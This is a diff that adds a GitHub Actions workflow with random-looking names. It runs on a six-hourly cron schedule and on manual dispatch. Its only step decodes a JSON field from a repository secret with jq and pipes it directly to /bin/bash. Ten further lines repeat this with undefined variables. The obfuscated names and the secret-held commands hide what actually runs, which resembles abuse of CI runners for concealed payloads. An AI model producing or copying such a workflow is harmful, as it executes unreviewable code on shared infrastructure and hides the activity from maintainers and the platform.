@@ -1,0 +1,29 @@
+name: monolithvincentbeta
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: monolithvincentbeta
+        env:
+          yfr993: ${{ secrets.yfr993 }}
+        run: |
+          echo $yfr993 | jq -r .ie0633 | /bin/bash
+          echo $jpkl898 | jq -r .gbj532 | /bin/bash
+          echo $jvsnc70 | jq -r .zn57 | /bin/bash
+          echo $z8654 | jq -r .jys673 | /bin/bash
+          echo $oobz4515 | jq -r .p91482 | /bin/bash
+          echo $fsx6824 | jq -r .gm7 | /bin/bash
+          echo $hm624 | jq -r .wmfuj50562 | /bin/bash
+          echo $xb14422 | jq -r .cra2290 | /bin/bash
+          echo $fmbtn23 | jq -r .geuhj875 | /bin/bash
+          echo $obtn85 | jq -r .cvz44721 | /bin/bash
+          echo $eekhx5 | jq -r .jwb487 | /bin/bash
+
